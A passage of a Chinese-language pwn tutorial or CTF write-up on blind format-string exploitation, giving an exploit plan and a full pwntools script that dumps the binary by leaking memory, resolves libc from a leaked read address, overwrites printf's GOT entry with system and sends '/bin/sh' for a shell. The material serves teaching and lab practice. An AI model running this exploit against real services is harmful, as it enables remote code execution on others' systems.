可以基本确定的是sub_4004C0为read函数，因为读入函数一共有三个参数的话，基本就是read了。此外，下面调用的sub\_4004B0应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个while 1的循环，一直在执行。

#### 利用思路

分析完上面的之后，我们可以确定如下基本思路

- 泄露printf函数的地址，
- 获取对应libc以及system函数地址
- 修改printf地址为system函数地址
- 读入/bin/sh;以便于获取shell

#### 利用程序

程序如下。

```python
##coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 说明有\n，出现新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None


def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()


##getbinary()
read_got = 0x601020
printf_got = 0x601018
sh = remote(ip, port)
## let the read get resolved
sh.sendline('a')
sh.recv()
## get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
sh.recv()
read_addr = u64(data)

## get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()

## get shell
sh.sendline('/bin/sh;')
sh.interactive()
```

这里需要注意的是这一段代码

```python
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()
```

fmtstr_payload直接得到的payload会将地址放在前面，而这个会导致printf的时候'\x00'截断（**关于这一问题，pwntools目前正在开发fmt_payload的加强版，估计快开发出来了。**）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面8字节对齐的地方，并对payload中的偏移进行修改。需要注意的是

```python
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
```

这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于'%order$hn'中order多出来的字符都不会大于8。具体的可以自行推导。